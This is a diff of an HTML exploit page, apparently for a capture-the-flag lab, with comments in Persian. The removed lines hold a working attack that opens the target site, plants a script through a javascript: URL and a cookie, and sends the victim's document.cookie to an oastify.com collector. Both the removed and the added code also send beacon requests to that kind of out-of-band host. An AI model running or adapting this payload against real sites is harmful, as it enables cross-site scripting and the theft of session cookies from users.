@@ -7,32 +7,7 @@
 <body>
     <h1>Exploiting... Please wait.</h1>
     <script>
-        // آدرس‌های خودت را جایگزین کن:
-        const TARGET_ORIGIN = "https://a28a7e0b9340.pwnbox-lab.com";
-        const OAST_URL = "https://eo6wpqso4lfx4l4kryupscekcbi26suh.oastify.com";
-
-        // ۱. اطلاع دادن به خودت که ادمین صفحه را باز کرده است
-        fetch(`${OAST_URL}/admin-landed`);
-
-        // ۲. باز کردن صفحه هدف در یک پنجره جدید (یا Tab جدید)
-        const victimWindow = window.open(`${TARGET_ORIGIN}/`);
-
-        // ۳. کمی صبر می‌کنیم تا صفحه کاملاً لود شود
-        setTimeout(() => {
-            if (victimWindow) {
-                // ۴. با تغییر location به یک javascript URL، کوکی را روی دامنه هدف ست می‌کنیم
-                // این اسکریپت پس از ست کردن کوکی، صفحه را مجدداً لود می‌کند تا کوکی جدید رندر شود
-                const payload = `javascript:(function(){
-                    document.cookie = "a=<script>window.postMessage(\\`fetch('${OAST_URL}/?flag='+encodeURIComponent(document.cookie))\\`, '*');<\\/script>; path=/; max-age=3600";
-                    location.reload();
-                })();`;
-                
-                victimWindow.location.href = payload;
-                fetch(`${OAST_URL}/payload-sent`);
-            } else {
-                fetch(`${OAST_URL}/popup-blocked`);
-            }
-        }, 2000);
+        fetch('http://edvweqhotl4xtltkgyjphc3k1b72vtji.oastify.com')
     </script>
 </body>
 </html>
